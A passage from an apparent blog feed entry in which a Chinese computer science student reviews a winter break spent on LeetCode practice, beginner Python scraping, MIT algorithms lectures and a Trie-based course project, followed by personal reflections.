<h1 id="学习"><a href="#学习" class="headerlink" title="学习"></a>学习</h1><h2 id="LeetCode"><a href="#LeetCode" class="headerlink" title="LeetCode"></a>LeetCode</h2><p>大二上刚开学的时候因为数据结构上到链表和树的缘故，在LeetCode上刷了20多道Tag是链表和树的题目。</p>
<p>寒假的时候决心开始刷LeetCode，至寒假结束时已经完成了126道题，其中包括了绝大部分Easy题，以及少部分Medium题，虽然和真正学好算法相差甚远，应该算是基本上入门了。</p>
<p>主要接触了分治法以及相关的复杂度分析，哈希表，随机化相关的算法（蓄水池抽样以及FisherYales洗牌算法），简单的动态规划等。</p>
<p>通过的题目以及解法托管在我的<a href="https://github.com/BlackDragonF/LeetcodeSolutions" target="_blank" rel="external">Github</a>上。</p>
<h2 id="Python爬虫入门"><a href="#Python爬虫入门" class="headerlink" title="Python爬虫入门"></a>Python爬虫入门</h2><p>参考书是《Python网络数据解析》，目前看到了第三章，主要接触了urlopen以及BeautifulSoup库以及最基本的爬虫思想，原书第三章的最后也简单的提到了爬虫用的Scrapy框架。</p>
<p>学习时候练习的代码托管在我的<a href="https://github.com/BlackDragonF/PythonScrapingLearning" target="_blank" rel="external">Github</a>上。</p>
<h2 id="MIT的算法导论公开课"><a href="#MIT的算法导论公开课" class="headerlink" title="MIT的算法导论公开课"></a>MIT的算法导论公开课</h2><p>目前看到了“快速排序以及随机化算法”这一节，但是对于之前所重点介绍的分治法的主定理仍然有不清楚的地方，需要花时间巩固学习并且配合LeetCode一起食用。</p>
<h2 id="数据结构课程设计"><a href="#数据结构课程设计" class="headerlink" title="数据结构课程设计"></a>数据结构课程设计</h2><p>因为其他事情的原因，我选的是最简单的第三题“基于查找表的单词检索软件”，但是我并没有使用二叉搜索树而是使用了Trie树来实现动态查找表。</p>
<p>抱着既然要做课设就不要糊弄的想法，这次的课设还是浪费了自己不少时间，在完成了最基本的Trie树以及Hash表之后，自己又实现了Hash表的迭代器以及Hash表的序列化，了解到了C语言中命令行参数的处理 - getopt。虽然程序仍然有大量可以优化和改进的地方，但是考虑到今年寒假投入的时间不是特别多，我总体上来说还是很满意的。</p>
<hr>
<blockquote>
<p>虽然说了不立Flag，写寒假总结督促自己，但是实际上今年寒假还是有各种堕怠，想要做的事情还是有很多没做，想想还是有点遗憾，但毕竟还是比大二上和去年寒假要好很多了。</p>
</blockquote>
<hr>
<blockquote>
<p>关于输入和输出：仅对于自己而言，我认为输入和输出都是必要的，如果只强调输入，而忽视输出，那么只知道知识本身而不会运用知识，于我而言会失去学习的兴趣，更何况在大多数时候，缺乏一定数量的练习的我们甚至还没有能真正的掌握知识；而如果是以为的强调输出，那么可能和大一的我一样，只能成为为一个劣质的API Caller而已。</p>
</blockquote>
<hr>
<blockquote>
<p>想到了去年团队总结说过的话，同样送给今天的自己：身为一个本科生，在扎实自己计算机基础的同时我也愿意更多的接触不同的方向比如iOS，Web的前端、后台技术甚至是一些设计的规范(世界这么大，我想去看看)。未来自己还要更加努力才行啊(毕竟现在的基础还是很弱)。<br></p>
</blockquote>
<h1 id="生活"><a href="#生活" class="headerlink" title="生活"></a>生活</h1><p>大二上因为种种原因而陷入了迷茫，加权没有刷上来，在自己想学的东西上也几乎没有花什么时间，一直在懒懒散散地混日子，生活更是一团糟，但是好在并没有做出让自己后悔的事。</p>
<p>寒假刚开始的时候想了很多，虽然前路漫漫，伤痛注定多余喜悦，但我也决定不再逃避过去的自己，正视现在的自己。假期的时候和很多曾经的同学交流过人生和发展，也终于鼓起勇气认识了更多的人，看到了更多不一样的人生。然后这样的自己，突然又获得了梦想。</p>
<p>每一个不曾起舞的日子都是对生命的辜负，以上。</p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;颓废的大二上之后感觉良好的一个寒假，可能是我自上学以来效率最高的一个寒假了。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;学习&quot;&gt;&lt;a href=&quot;#学习&quot; class=&quot;headerlink&quot; title=&quot;学习&quot;&gt;&lt;/a&gt;学习&lt;/h1&gt;
    
    </summary>
    
      <category term="杂谈" scheme="http://blog.codedragon.tech/categories/%E6%9D%82%E8%B0%88/"/>
    
    
      <category term="总结" scheme="http://blog.codedragon.tech/tags/%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
</feed>
